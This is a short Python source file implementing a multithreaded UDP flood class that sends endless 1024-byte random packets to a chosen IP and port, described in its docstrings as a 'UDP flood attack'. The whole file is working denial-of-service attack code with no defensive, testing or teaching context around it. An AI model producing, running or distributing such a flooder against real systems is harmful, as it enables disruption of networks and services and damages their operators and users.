import socket
import random
import threading

class UDPFlood:
    def __init__(self, target_ip, target_port, amp_factor=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.amp_factor = amp_factor
        self.running = False
        self.threads = []

    def generate_random_data(self, size):
        """Generate random UDP payload"""
        return bytes(random.getrandbits(8) for _ in range(size))

    def udp_flood(self):
        """Send UDP packets to target"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while self.running:
            try:
                # Amplified UDP packets
                for _ in range(self.amp_factor):
                    data = self.generate_random_data(1024)
                    s.sendto(data, (self.target_ip, self.target_port))
            except:
                pass

    def start(self, threads=10):
        """Start UDP flood attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop UDP flood attack"""
        self.running = False
        for t in self.threads:
            t.join()
